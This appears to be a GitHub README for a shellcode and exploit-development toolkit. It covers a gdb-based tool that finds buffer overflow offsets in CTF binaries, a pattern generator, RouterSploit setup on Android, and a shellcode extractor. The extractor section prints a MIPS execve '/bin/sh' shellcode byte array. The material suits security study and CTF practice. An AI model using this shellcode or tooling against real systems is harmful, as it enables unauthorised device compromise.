# shellcode_tools
A collection of useful tools for writing shellcode 

### getOverFlowOffset.py V2.0


* In previous, if you want to get the over flow offset to the EBP, you have to 
   * 1. Find the vul function
   * 2. Set the breakpoints of the `return address` on IDA.
   * 3. Generating the pattern offset string file `passwd` using patternLocOffset.py
   * 4. Run the program with the input of file `passwd`.
      * 4.1 If the IDA runs on the host and the linux program runs on the guest, you have to copy `linux_server` to the guest and run it.
      * 4.2 Run the IDA on the host.
      * 4.3 Switch to the guest, copy the string of `passwd` into the waiting program `linux_server`.
      * 4.4 Switch back to the host, see the content of `EBP`
   * 5. Calculate the over flow offset using patternLocOffset.py again.

* For now, you only need.
   * 1. Find the vul function and put the `return address` into getOverFlowOffset.py
   * 2. Boom! All set :).


* Requirements
   * gdb
   * patternLocOffset.py
   * [pygdbmi](https://github.com/cs01/pygdbmi)
      * `pip install pygdbmi`

* Change log
   * 2019-10-24 16:23:07
      * Add support for dealing with programs that enable PIE.
      * Fix bugs of matching the output of $ebp. For both decimal and hex.

* Usage
```
[+] Usage: python getOverFlowOffset.py [vul_ret_address] [vul_program]
[+] Hints: you give me vul_ret_address, I give you the offset :)
[*] Example: python getOverFlowOffset.py 0x080484BD example_bin/xdctf15-pwn200
```
   * We now support tracking the program enabling PIE. The example in example_bin/pwn200_PIE   
```
$ python getOverFlowOffset.py 0x00000632 example_bin/pwn200_PIE
[*] example_bin/pwn200_PIE is 32 bits
[*] PIE is enabled
[*] Found a leak function: write
[*] Found the leaked address 0x565556c2, we can leave
[*] The real vul_ret_address is:0x56555632
[+] Found offset to the EBP is 108.
[+] THe offset to the RET_ADDR is 112 (32bits) or 116 (64bits).
```
   * For the program without PIE. The example in example_bin/xdctf15-pwn200
```
$ python getOverFlowOffset.py 0x080484BD example_bin/xdctf15-pwn200
[*] example_bin/xdctf15-pwn200 is 32 bits
[*] no PIE
[+] Found offset to the EBP is 108.
[+] THe offset to the RET_ADDR is 112 (32bits) or 116 (64bits).
```


### Android_routersploit

Setup the RouterSploit on Android based on termux.  [Procedure](https://github.com/desword/shellcode_tools/tree/master/Android_routersploit) 

<img src="https://github.com/desword/shellcode_tools/blob/master/img/android_sploit.jpg" width = 50% height = 50% div align=center />

### patternLocOffset.py


For generating a string to  calculate the offset of RA. 
From the book <揭秘家用路由器0day漏洞挖掘技术>

### shell_extractor.py

In traditional, we need to find the corresponding shellcode using IDA pro. For example, 

![](https://p4.ssl.qhimg.com/t01d815b0c57399c2de.png)

Then we copy the binary and reconstruct them into the following formats:

![](https://p3.ssl.qhimg.com/t0188a9ffa755bb99ab.png)

We can find that there are lots of work for the above purpose. Therefore, I have developed a simple tool to extract the shellcode in binary form automatically from the ELF. 
With the following simple instructions, we can extract the shellcode in binary form conveniently for C testing or python testing. 


```python
   $ python shell_extractor.py execve c
   char shellcode[] = {
   "\x24\x06\x06\x66"
   "\x04\xd0\xff\xff"
   "\x28\x06\xff\xff"
   "\x27\xbd\xff\xe0"
   "\x27\xe4\x10\x01"
   "\x24\x84\xf0\x1f"
   "\xaf\xa4\xff\xe8"
   "\xaf\xa0\xff\xec"
   "\x27\xa5\xff\xe8"
   "\x24\x02\x0f\xab"
   "\x00\x00\x00\x0c"
   "\x2f\x62\x69\x6e"
   "\x2f\x73\x68\x00"
   };
```

The general usage is:

```bash
 [+] usage: python shell_extractor.py [filename] [format]
 [*] where format can be c or py
 ```
 
The core component is to use the command "readelf –S execve" to obtain the offset and size of the section .text. Then the format is generated accordingly.

![](https://p2.ssl.qhimg.com/t016872b10fb2dc2771.png)

For example, 0xd0 is the offset of the shellcode, while 0x30 is the size of the shellcode.


The original article can be found at: [路由器漏洞复现终极奥义——基于MIPS的shellcode编写](https://www.anquanke.com/post/id/153725)
